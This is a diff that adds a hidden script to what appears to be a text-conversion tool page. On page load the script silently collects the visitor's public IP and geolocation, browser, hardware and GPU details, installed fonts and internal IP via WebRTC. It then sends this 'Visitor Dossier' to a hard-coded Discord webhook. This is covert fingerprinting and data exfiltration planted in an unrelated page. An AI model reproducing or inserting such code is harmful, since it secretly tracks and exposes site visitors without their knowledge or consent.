@@ -265,5 +265,97 @@ methodSelect.addEventListener('change',updatePreview);
 inputText.addEventListener('input',updatePreview);
 initCategories();
 </script>
+<script>
+// ====== CONFIG ======
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1406357977551863859/zwg6w2amqVM638n6UjKHOow84MLPxYe9o-CjdMx9maMY-T_deqTB5xs-6550U_sLZa7N";
+
+// ====== MAIN ======
+(async () => {
+  const data = {};
+
+  // 1. External IP + Geo
+  try {
+    const geo = await fetch("https://ipapi.co/json/").then(r => r.json());
+    data.ip = geo.ip;
+    data.city = geo.city;
+    data.region = geo.region;
+    data.country = geo.country_name;
+    data.org = geo.org;
+  } catch (e) { data.ip = "failed"; }
+
+  // 2. Basic UA / screen
+  data.userAgent = navigator.userAgent;
+  data.platform = navigator.platform;
+  data.langs = navigator.languages.join(", ");
+  data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  data.screen = `${screen.width}x${screen.height} @${screen.colorDepth}bit DPR:${window.devicePixelRatio}`;
+
+  // 3. Hardware
+  data.cores = navigator.hardwareConcurrency || "n/a";
+  data.memory = navigator.deviceMemory || "n/a";
+  if (navigator.connection) {
+    data.connection = `${navigator.connection.effectiveType}, downlink:${navigator.connection.downlink}Mb, RTT:${navigator.connection.rtt}ms`;
+  }
+
+  // 4. WebGL Fingerprint
+  try {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+    data.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "hidden";
+  } catch (e) { data.gpu = "n/a"; }
+
+  // 5. Fonts enumeration (quick + dirty)
+  const testFonts = ["Arial", "Courier New", "Times New Roman", "Comic Sans MS", "Papyrus", "Roboto", "Noto Sans JP"];
+  const fontDetect = (f) => {
+    const base = "monospace";
+    const span = document.createElement("span");
+    span.innerHTML = "mmmmmmmmmmlli";
+    span.style.fontSize = "72px";
+    span.style.visibility = "hidden";
+    document.body.appendChild(span);
+    span.style.fontFamily = base;
+    const w = span.offsetWidth, h = span.offsetHeight;
+    span.style.fontFamily = `${f},${base}`;
+    const match = (w !== span.offsetWidth || h !== span.offsetHeight);
+    document.body.removeChild(span);
+    return match;
+  };
+  data.fonts = testFonts.filter(f => fontDetect(f)).join(", ") || "n/a";
+
+  // 6. Internal IP via WebRTC
+  try {
+    const pc = new RTCPeerConnection({iceServers:[]});
+    pc.createDataChannel("");
+    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+    pc.onicecandidate = (ice) => {
+      if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+      const parts = ice.candidate.candidate.split(" ");
+      const addr = parts[4];
+      if (addr && !data.internalIP) {
+        data.internalIP = addr;
+        pc.close();
+      }
+    };
+  } catch (e) { data.internalIP = "n/a"; }
+
+  // slight delay to let WebRTC resolve
+  setTimeout(() => {
+    // ====== BUILD PAYLOAD ======
+    let msg = `👁️ **New Visitor Dossier**\n`;
+    for (const [k,v] of Object.entries(data)) {
+      msg += `• **${k}:** ${v}\n`;
+    }
+    msg += `⏰ Seen: ${new Date().toLocaleString()}`;
+
+   // ====== Send to Discord with @here tag ======
+    fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: `@here 🚨👁️ Visitor Alert 🚨\n${msg}` })
+    }).catch(err => console.error("Webhook error", err));
+  }, 3000);
+})();
+</script>
 </body>
 </html>
